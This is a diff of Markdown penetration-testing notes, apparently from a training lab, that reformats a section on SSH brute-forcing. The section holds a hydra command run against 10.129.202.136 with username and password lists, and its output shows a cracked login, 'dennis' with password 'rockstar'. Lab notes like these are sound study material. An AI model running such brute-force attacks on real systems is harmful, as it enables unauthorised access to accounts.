@@ -71,16 +71,16 @@ Nmap (“Network Mapper”) is a free and open-source utility for network discov
 
 ## Bruteforce de SSH
 
-| Command | Description |
-|---------|-------------|
-| `hydra -L username.list -P password.list ssh://10.129.202.136` | Bruteforce de SSH |
-| Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). | |
-| Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-08 09:41:16 | |
-| `[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4` | |
-| `[DATA] max 16 tasks per 1 server, overall 16 tasks, 21112 login tries (l:104/p:203), ~1320 tries per task` | |
-| `[DATA] attacking ssh://10.129.202.136:22/` | |
-| `[STATUS] 156.00 tries/min, 156 tries in 00:01h, 20958 to do in 02:15h, 14 active` | |
-| `[22][ssh] host: 10.129.202.136   login: dennis   password: rockstar` | |
+`hydra -L username.list -P password.list ssh://10.129.202.136 `
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-08 09:41:16
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 21112 login tries (l:104/p:203), ~1320 tries per task
+[DATA] attacking ssh://10.129.202.136:22/
+[STATUS] 156.00 tries/min, 156 tries in 00:01h, 20958 to do in 02:15h, 14 active
+[22][ssh] host: 10.129.202.136   login: **dennis**   password: __rockstar__
 
 ## Bruteforce de RDP
 
